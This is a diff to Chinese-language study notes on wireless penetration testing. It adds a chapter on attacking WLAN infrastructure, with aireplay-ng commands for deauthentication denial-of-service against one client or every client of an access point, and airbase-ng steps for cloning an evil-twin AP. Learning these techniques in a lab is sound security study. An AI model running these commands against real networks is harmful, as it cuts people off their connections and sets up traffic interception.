@@ -102,7 +102,7 @@
             wlan.fc.tyoe == 1 // 控制帧
             wlan.fc.tyoe == 2 // 数据帧
     2.5. 实验环境中数据包嗅探
-        2.5.1. 查看路由器(AP)所处信道
+        2.5.1. 查看路由器(AP)所处信道 (重要!!!)
             sudo airodump-ng --bssid (AP mac地址) wlan0mon
         2.5.2. 无线网卡锁定信道
             sudo iwconfig wlan0mon channel xx
@@ -178,7 +178,24 @@
             查看获取的无线信息
                 cat /var/lib/dhclient/dhclient.leases
 第五章、攻击wlan基础设施
-    5.1.
+    5.1. 解除验证Dos攻击
+        5.1.1. 查看链接AP客户端信息
+            sudo airodump-ng -c (AP 信道) wlan0mon
+        5.1.2. 针对指定客户端发动解除验证攻击
+            sudo aireplay-ng -0 5 -a (AP mac地址) -c (客户端 mac地址) --ignore-negative-one wlan0mon
+        5.1.3. 针对所有链接AP客户端发动解除验证攻击
+            sudo aireplay-ng -0 5 -a (AP mac地址) --ignore-negative-one wlan0mon
+    5.2. evil twin (克隆AP)
+        5.2.1. 查看链接AP客户端bssid和essid
+            sudo airodump-ng -c (AP 信道) wlan0mon
+        5.2.2. 克隆AP
+            sudo airbase-ng -essid "AP name" -c 6 wlan0mon
+        5.2.3. 查看新生成的AP
+            sudo airodump-ng -c (AP 信道) wlan0mon
+        5.2.4. 针对所有链接AP客户端发动解除验证攻击
+            sudo aireplay-ng -0 5 -a (AP mac地址) --ignore-negative-one wlan0mon
+    5.3. 无赖AP
+
 
 
 
